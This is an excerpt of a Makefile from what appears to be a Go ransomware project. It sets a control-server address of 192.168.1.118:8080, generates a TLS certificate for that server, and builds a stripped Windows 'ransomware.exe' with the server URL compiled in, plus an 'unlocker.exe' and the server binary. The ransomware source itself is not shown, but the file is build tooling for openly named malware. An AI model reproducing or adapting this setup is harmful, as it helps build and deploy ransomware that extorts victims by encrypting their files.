...
SERVER_HOST?=192.168.1.118
SERVER_PORT?=8080
SERVER_URL=http://$(SERVER_HOST):$(SERVER_PORT)
LINKER_VARS=-X main.ServerUrl=$(SERVER_URL)
...
pre-build: clean-bin
	...
	cd $(BUILD_DIR)/server && env GOOS=linux go run /usr/local/go/src/crypto/tls/generate_cert.go \
		--host $(SERVER_HOST)
	mkdir -p $(BIN_DIR)/server

build: pre-build
	cd $(BUILD_DIR)/ransomware && GOOS=windows GOARCH=386 go build --ldflags \
		"-s -w $(LINKER_VARS)" -o $(BIN_DIR)/ransomware.exe
	cd $(BUILD_DIR)/unlocker && GOOS=windows GOARCH=386 go build --ldflags "-s -w" \
		-o $(BIN_DIR)/unlocker.exe
	cd $(BUILD_DIR)/server && go build --ldflags "-s -w" && mv `ls | grep -v 'server.go'` \
		$(BIN_DIR)/server
